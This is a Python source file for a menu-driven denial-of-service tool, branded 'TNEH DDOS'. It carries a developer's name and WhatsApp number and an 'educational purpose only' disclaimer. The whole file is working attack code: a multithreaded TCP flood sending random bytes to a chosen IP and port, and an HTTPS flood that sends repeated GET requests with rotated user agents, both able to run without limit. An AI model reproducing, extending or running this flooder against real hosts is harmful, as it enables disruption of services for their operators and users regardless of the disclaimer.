import socket
import threading
import requests
import random
import time
import os
import sys
from datetime import datetime

# Global variable to control attacks
attack_running = False
attack_threads = []

# Function to clear the terminal screen
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Function to print colored text
def print_color(text, color_code):
    print(f"\033[{color_code}m{text}\033[0m")

# Function to display a "button" in terminal
def show_button(text, width=50):
    border = "═" * (width - 2)
    print_color(f"╔{border}╗", "96")
    print_color(f"║{text.center(width - 2)}║", "96")
    print_color(f"╚{border}╝", "96")

# Function to display header
def show_header():
    clear_screen()
    banner_text = """
████████╗███╗   ██╗███████╗██╗  ██╗
╚══██╔══╝████╗  ██║██╔════╝██║  ██║
   ██║   ██╔██╗ ██║█████╗  ███████║
   ██║   ██║╚██╗██║██╔══╝  ██╔══██║
   ██║   ██║ ╚████║███████╗██║  ██║
   ╚═╝   ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
                                    
 ██████╗ ██████╗  ██████╗ ███████╗ 
 ██╔══██╗██╔══██╗██╔═══██╗██╔════╝ 
 ██║  ██║██║  ██║██║   ██║███████╗ 
 ██║  ██║██║  ██║██║   ██║╚════██║ 
 ██████╔╝██████╔╝╚██████╔╝███████║ 
 ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝ 
"""
    print_color(banner_text, "91")
    print_color("═" * 60, "93")
    print_color("🚀 DEVELOPED BY NOMAN - WhatsApp: 01611229803 🚀", "93")
    print_color("═" * 60, "93")
    print_color("⚠️  EDUCATIONAL PURPOSE ONLY - USE RESPONSIBLY  ⚠️", "91")
    print_color("═" * 60, "93")
    print()

# TCP flood function
def tcp_flood(ip, port, packet_count):
    global attack_running
    count = 0
    while attack_running and (packet_count == 0 or count < packet_count):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((ip, port))
            data = random._urandom(1024)
            sock.send(data)
            sock.close()
            count += 1
            print_color(f"[TCP] Packet {count} sent to {ip}:{port}", "92")
        except Exception as e:
            print_color(f"[TCP] Failed to send packet to {ip}:{port} - {str(e)}", "91")
        if packet_count == 0:
            time.sleep(0.1)

# HTTPS flood function
def https_flood(url, request_count):
    global attack_running
    count = 0
    while attack_running and (request_count == 0 or count < request_count):
        try:
            headers = {
                'User-Agent': random.choice([
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                    'Chrome/91.0.4472.124 Safari/537.36'
                ])
            }
            response = requests.get(url, headers=headers, timeout=5)
            count += 1
            print_color(f"[HTTPS] Request {count} sent to {url} | Status: {response.status_code}", "92")
        except Exception as e:
            print_color(f"[HTTPS] Failed to send request to {url} - {str(e)}", "91")
        if request_count == 0:
            time.sleep(0.1)

# Function to get user input with color
def get_input(prompt, default=""):
    print_color(f"{prompt} ", "96", end="")
    if default:
        print_color(f"[{default}]", "90", end=" ")
    user_input = input().strip()
    return user_input if user_input else default

# Main attack function
def start_attack():
    global attack_running, attack_threads
    
    show_header()
    
    print_color("🎯 SELECT ATTACK TYPE:", "95")
    print_color("1. TCP Flood Attack", "96")
    print_color("2. HTTPS Flood Attack", "96")
    print()
    
    attack_type = get_input("Choose attack type (1/2):", "1")
    
    if attack_type == "1":
        print_color("\n🔧 TCP FLOOD CONFIGURATION", "95")
        ip = get_input("Target IP:", "127.0.0.1")
        port = int(get_input("Target Port:", "80"))
        threads = int(get_input("Number of Threads:", "10"))
        packet_count = int(get_input("Packets per thread (0 for unlimited):", "0"))
        
        print_color(f"\n🎯 Starting TCP Flood on {ip}:{port}", "93")
        print_color(f"📊 Configuration: {threads} threads, {packet_count if packet_count > 0 else 'unlimited'} packets", "93")
        
    elif attack_type == "2":
        print_color("\n🔧 HTTPS FLOOD CONFIGURATION", "95")
        url = get_input("Target URL:", "https://example.com")
        threads = int(get_input("Number of Threads:", "10"))
        request_count = int(get_input("Requests per thread (0 for unlimited):", "0"))
        
        print_color(f"\n🎯 Starting HTTPS Flood on {url}", "93")
        print_color(f"📊 Configuration: {threads} threads, {request_count if request_count > 0 else 'unlimited'} requests", "93")
    
    else:
        print_color("❌ Invalid selection!", "91")
        return
    
    print_color("\n🚀 PRESS ENTER TO START DDOS ATTACK", "92")
    input()
    
    # Start attack
    attack_running = True
    attack_threads = []
    start_time = datetime.now()
    
    print_color(f"\n⏰ Attack started at: {start_time.strftime('%Y-%m-%d %H:%M:%S')}", "92")
    print_color("🛑 Press Ctrl+C to stop the attack", "91")
    print_color("─" * 60, "90")
    
    try:
        if attack_type == "1":
            for i in range(threads):
                thread = threading.Thread(target=tcp_flood, args=(ip, port, packet_count))
                thread.daemon = True
                thread.start()
                attack_threads.append(thread)
        else:
            for i in range(threads):
                thread = threading.Thread(target=https_flood, args=(url, request_count))
                thread.daemon = True
                thread.start()
                attack_threads.append(thread)
        
        # Keep main thread alive while attack is running
        while attack_running:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print_color("\n\n🛑 Attack interrupted by user!", "91")
    finally:
        attack_running = False
        end_time = datetime.now()
        duration = end_time - start_time
        
        print_color("─" * 60, "90")
        print_color(f"⏰ Attack duration: {duration}", "93")
        print_color("🎯 Attack stopped!", "91")
        
        print_color("\n🔄 PRESS ENTER TO RETURN TO MAIN MENU", "96")
        input()

# Main menu function
def main_menu():
    while True:
        show_header()
        
        print_color("🎮 MAIN MENU - SELECT AN OPTION:", "95")
        print()
        show_button("🚀 1. START DDOS ATTACK", 40)
        show_button("📊 2. ATTACK STATISTICS", 40)
        show_button("❌ 3. EXIT", 40)
        print()
        
        choice = get_input("Enter your choice (1-3):", "1")
        
        if choice == "1":
            start_attack()
        elif choice == "2":
            show_statistics()
        elif choice == "3":
            print_color("\n👋 Thank you for using TNEH DDOS Tool!", "92")
            print_color("⚠️  Remember: Use responsibly for educational purposes only!", "91")
            sys.exit(0)
        else:
            print_color("❌ Invalid choice! Please try again.", "91")
            time.sleep(2)

# Statistics function
def show_statistics():
    show_header()
    print_color("📊 ATTACK STATISTICS", "95")
    print_color("─" * 60, "90")
    print_color("📈 This feature would show:", "96")
    print_color("   • Total attacks performed", "96")
    print_color("   • Success/failure rates", "96")
    print_color("   • Historical data", "96")
    print_color("   • Performance metrics", "96")
    print_color("─" * 60, "90")
    print_color("\n🔄 PRESS ENTER TO RETURN TO MAIN MENU", "96")
    input()

# Enhanced print_color function
def print_color(text, color_code, end="\n"):
    color_codes = {
        "90": "1;30",  # gray
        "91": "1;31",  # red
        "92": "1;32",  # green
        "93": "1;33",  # yellow
        "94": "1;34",  # blue
        "95": "1;35",  # purple
        "96": "1;36",  # cyan
    }
    code = color_codes.get(color_code, "1;37")
    print(f"\033[{code}m{text}\033[0m", end=end)

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print_color("\n\n👋 Tool stopped by user. Goodbye!", "92")
        sys.exit(0)
